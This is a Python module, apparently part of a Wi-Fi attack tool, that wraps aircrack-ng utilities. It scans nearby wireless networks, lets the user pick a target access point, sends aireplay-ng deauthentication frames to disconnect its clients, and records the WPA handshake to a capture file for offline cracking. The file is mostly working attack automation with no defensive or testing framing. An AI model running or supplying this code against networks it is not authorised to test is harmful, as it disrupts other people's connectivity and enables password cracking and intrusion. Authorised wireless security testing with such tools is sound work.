"""
Scan methods
"""
import os
from shutil import rmtree
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from services import Service
from execute_process import Process


class Scan:
    """
    This class contains method for scanning wireless networks
    """

    def __init__(self):
        pass

    async def validate_monitor_mode(self, interface=None):
        """
        Validate if the selected interface is in monitor mode
        """
        monitor_mode_params = [
            'iw',
            'dev',
        ]

        monitor_mode_process = Process(monitor_mode_params)
        _, stdout = await monitor_mode_process.see_end_result_process(
            'validate monitor mode')

        is_monitor = False

        interfaces_str = stdout.split("Interface")
        # clean text
        sanitized_data = []
        for iface in interfaces_str:
            iface_to_list = iface.split("\n")
            sanitized_data.append([a.strip() for a in iface_to_list])

        for i in sanitized_data:
            if interface in i:
                if "type monitor" in i:
                    print(f"{interface} is in monitor mode")
                    is_monitor = True
                    break

        if not is_monitor:
            print(f"{interface} is not in monitor mode")

        return is_monitor

    async def get_interfaces(self):
        """
        Get all availables interfaces in the system
        """

        get_interfaces_params = [
            'iw',
            'dev',
        ]

        monitor_mode_process = Process(get_interfaces_params)
        _, stdout = await monitor_mode_process.see_end_result_process(
            'get interfaces')
        interfaces_str = stdout.split("\n")

        interfaces = []
        for iface in interfaces_str:
            text = iface.strip()
            if "Interface" in text:
                text = text.split(" ")
                interfaces.append(text[1])

        return interfaces

    async def airmon_ng_start(self, interface):
        """
        Start monitor mode
        """
        airmon_ng_start_params = [
            'airmon-ng',
            'start',
            interface
        ]

        airmon_ng_start_process = Process(airmon_ng_start_params)
        result, _ = await airmon_ng_start_process.see_end_result_process(
            'start monitor mode')

        return result

    async def airodump_ng(self, interface, timeout=10):
        """
        This method returns the availables wireless networks
        """
        airodump_ng_params = [
            'airodump-ng',
            interface
        ]

        airodump_ng_process = Process(airodump_ng_params)
        result, stdout = await airodump_ng_process.see_result_process(
            'scanning wireless network', timeout=timeout)

        if result is None:
            print("An error ocurred")
            return None

        data_split = stdout.split('Elapsed')
        if len(data_split) == 0:
            print("No wireless networks availables")
            return None

        data_target = data_split[len(data_split)-1]

        targets_info = data_target.split("BSSI")[1]

        list_info = []

        targets_info = targets_info.splitlines()
        if len(targets_info) == 0:
            return None

        keys = targets_info[0].strip().split(" ")
        keys[0] = "BSSID"
        for index, target in enumerate(targets_info):

            if "<length: 0>" in target:
                continue

            if index > 0:
                info = {}
                for index, item in enumerate(target.strip().split(" ")):
                    if index <= 10:
                        info[keys[index]] = item
                    else:
                        info["ESSID"] = f"{info['ESSID']} {item}"

                list_info.append(info)

        return list_info

    async def get_target(self, targets):
        """
        Return target selected
        """
        indexed_targets = list(
            map(lambda target:
                {**target, 'index': targets.index(target)},
                targets))

        console = Console()
        targets_table = Table(title="Redes Wifi disponibles")
        targets_table.add_column("Index", style="bold green")
        targets_table.add_column("ESSID ", style="bold green")
        targets_table.add_column("DBM ", style="bold green")
        targets_table.add_column("Signal Quality", style="bold green")
        targets_table.add_column("Channel ", style="bold green")
        targets_table.add_column("Traffic ", style="bold green")
        targets_table.add_column("Data (KB) ", style="bold green")
        targets_table.add_column("Encryption ", style="bold green")

        for target in indexed_targets:
            
            traffic = "Yes" if int(target['#Data,']) > 0 else "No"

            data_packets = int(target['#Data,'])

            packet_size_bytes = 1024
            traffic_kb = (data_packets * packet_size_bytes) / 1024

            dbm = int(target['PWR'])
            if dbm >= -50:
                signal_quality = "Excellent"
            elif dbm >= -60:
                signal_quality = "Very Good"
            elif dbm >= -70:
                signal_quality = "Good"
            elif dbm >= -80:
                signal_quality = "Low"
            elif dbm >= -90:
                signal_quality = "Very Low"
            else:
                signal_quality = "Unacceptable"

            targets_table.add_row(
                str(target['index']),
                target['ESSID'],
                target['PWR'],
                signal_quality,
                target['CH'],
                traffic,
                f"{traffic_kb:.2f} KB",
                target['AUTH']
            )

        console.print(targets_table)
        wlan_index = Prompt.ask(
            'Select a target',
            choices=[str(target['index']) for target in indexed_targets])
        wlan = indexed_targets[int(wlan_index)]

        return wlan

    async def get_interface(self, interfaces):
        """
        Get interface selected
        """
        if len(interfaces) == 0:
            return None

        indexed_interfaces = []
        for index, interface in enumerate(interfaces):
            indexed_interfaces.append({"index": index, "interface": interface})

        # Make a table for intefaces

        console = Console()
        interfaces_table = Table(title="Availabes interfaces")
        interfaces_table.add_column("Index", style="bold green")
        interfaces_table.add_column("Interface", style="bold green")

        for interface in indexed_interfaces:
            interfaces_table.add_row(
                str(interface['index']), interface['interface'])

        console.print(interfaces_table)

        interface_index = Prompt.ask(
            "Select a interface",
            choices=[str(interface['index'])
                     for interface in indexed_interfaces])

        return indexed_interfaces[int(interface_index)]['interface']

    async def disconnect_devices(self,
                                 interface,
                                 bssid,
                                 channel,
                                 attempts=10):
        """
        Sends signal to disconnect devices from the network
        """

        success = False

        result_set_channel, _ = await Service().set_channel(
            interface=interface,
            channel=channel)

        if not result_set_channel:
            return success

        # remove colons from mac address
        mac_address_no_colons = bssid.replace(":", "").lower()

        disconnec_devices_params = [
            'aireplay-ng',
            '--deauth',
            str(attempts),
            '-a', mac_address_no_colons,
            interface,
        ]
        success, _ = await Process(
            disconnec_devices_params).see_end_result_process(
                description=f"By sending a deauthentication signal to:{bssid}")

        if not success:
            print("Error: device disconnect signal not sent")
            return success

        return success

    async def catch_handshake(self, interface,
                              bssid,
                              channel=1,
                              timeout=60,
                              output_essid='output'):
        """
        capture the handshake
        """

        script_dir = os.path.dirname(os.path.abspath(__file__))
        output_dir = os.path.join(script_dir, 'output', output_essid)

        # clean directory
        try:
            print("Clean the directory")
            rmtree(output_dir)
        except FileNotFoundError:
            print("Directory not found")
        except Exception:
            print("An error has occurred :)")
            raise

        os.makedirs(output_dir, exist_ok=True)

        output_path = os.path.join(output_dir, output_essid)

        catch_handshake_params = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", output_path,
            interface
        ]
        result, stdout = await Process(
            catch_handshake_params).see_result_process(
            description="Starting handshake capture...", timeout=timeout)

        captured_handshake = None

        if result is None:
            return captured_handshake

        data_split = stdout.split('Elapsed')
        if len(data_split) == 0:
            print("No data available")
            return captured_handshake

        data_target = data_split[len(data_split)-1]

        targets_info = data_target.split("BSSI")[0]

        targets_info = targets_info.splitlines()
        if len(targets_info) == 0:
            return captured_handshake

        for line in targets_info:
            if 'handshake' in line:
                print("Good luck, handshake captured :)")
                file_cap_name = f"{output_essid}-01.cap"
                captured_handshake = os.path.join(
                    output_dir, file_cap_name)
                break

        print("Scan finished")

        return captured_handshake
